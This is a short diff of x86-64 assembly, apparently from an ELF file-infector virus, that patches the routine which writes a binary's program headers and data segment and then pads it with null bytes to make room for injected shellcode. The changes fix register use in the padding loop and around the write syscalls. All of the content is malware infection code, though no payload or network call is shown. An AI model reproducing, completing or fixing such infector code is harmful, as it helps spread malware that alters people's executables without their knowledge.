@@ -730,6 +730,7 @@ retn
 parse64elfsec:
 	sub rsp, 8; offset of "new sect", where we will put pad and shellcode
 	sub rsp, 8;start offset 
+	mov r10, rdx; we're gonna need rdx for syscalls
 	; find offset where we will put our shellcode
 	call find_end_data_seg ; rax now contains the offset to the beg of pad & shellcode
 	mov [rsp + 8], rax
@@ -745,13 +746,13 @@ parse64elfsec:
 	add rax, QWORD[rsi + 32]; e_phoff
 	mov [rsp], rax; [rsp] ==  e_phoff + (sizeof(Elf64_Phdr) * e_phnum)
 	lea rsi, [rsi + rax]; file after phdrs
-	mov rdx, [rsp + 8]
+	mov rdx, [rsp + 8]; offset new sect
 	sub rdx, [rsp]; rdx == (new_sect - start)
 	mov rax, 1
 	syscall;write(wfd, file + start, new_sect - start); basically print all from phdrs till end of data seg
 	xor rcx, rcx
 	loop_print_pad:
-	cmp rcx, rdx
+	cmp rcx, r10
 	jae loop_print_pad_end
 	push rsi
 	push rcx
@@ -760,7 +761,7 @@ parse64elfsec:
 	mov rdx, 1
 	mov rax, 1
 	syscall; write(wfd, "\0", 1);
-	pop rsi; pop the "\0"
+	pop rdx; pop the "\0"
 	pop rcx
 	pop rsi
 	inc rcx
